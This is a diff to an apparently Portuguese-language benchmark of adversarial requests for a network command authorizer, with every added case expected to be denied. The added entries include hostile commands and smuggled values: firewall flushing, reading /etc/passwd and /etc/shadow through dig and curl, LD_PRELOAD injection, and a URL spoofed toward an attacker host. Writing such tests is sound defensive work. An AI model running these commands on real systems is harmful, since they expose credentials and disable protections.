@@ -198,6 +198,56 @@ SOLICITACOES_BENCHMARK = (
         "permitido_padrao": False,
         "permitido_restritiva": False,
     },
+    # --- Casos adversariais de evasao e contrabando (Etapa 7 refinada) ---
+    {
+        "id": "adv_01",
+        "categoria": "contrabando_campo_duplo",
+        "solicitacao": {"operacao": "testar_ping", "dispositivo": "client1", "parametros": {"pacotes": 2}, "comando_bruto": "iptables -F"},
+        "permitido_padrao": False,
+        "permitido_restritiva": False,
+    },
+    {
+        "id": "adv_02",
+        "categoria": "exfiltracao_arquivo_dig_batch",
+        "solicitacao": {"dispositivo": "client1", "comando_bruto": "dig -f /etc/passwd @192.168.20.10"},
+        "permitido_padrao": False,
+        "permitido_restritiva": False,
+    },
+    {
+        "id": "adv_03",
+        "categoria": "leitura_config_curl_K",
+        "solicitacao": {"dispositivo": "client1", "comando_bruto": "curl -K /etc/shadow http://192.168.20.10/"},
+        "permitido_padrao": False,
+        "permitido_restritiva": False,
+    },
+    {
+        "id": "adv_04",
+        "categoria": "execucao_lote_ip_batch",
+        "solicitacao": {"dispositivo": "client1", "comando_bruto": "ip -batch /tmp/comandos.txt"},
+        "permitido_padrao": False,
+        "permitido_restritiva": False,
+    },
+    {
+        "id": "adv_05",
+        "categoria": "ip_ofuscado_nao_canonico",
+        "solicitacao": {"operacao": "testar_ping", "dispositivo": "client1", "parametros": {"destino": "::ffff:192.168.20.10", "pacotes": 2}},
+        "permitido_padrao": False,
+        "permitido_restritiva": False,
+    },
+    {
+        "id": "adv_06",
+        "categoria": "injecao_env_ld_preload",
+        "solicitacao": {"dispositivo": "client1", "comando_bruto": "LD_PRELOAD=/tmp/x.so ping -n -c 1 192.168.20.10"},
+        "permitido_padrao": False,
+        "permitido_restritiva": False,
+    },
+    {
+        "id": "adv_07",
+        "categoria": "spoofing_url_userinfo",
+        "solicitacao": {"operacao": "testar_http", "dispositivo": "client1", "parametros": {"url": "http://192.168.20.10@atacante.externo/"}},
+        "permitido_padrao": False,
+        "permitido_restritiva": False,
+    },
 )
 
 
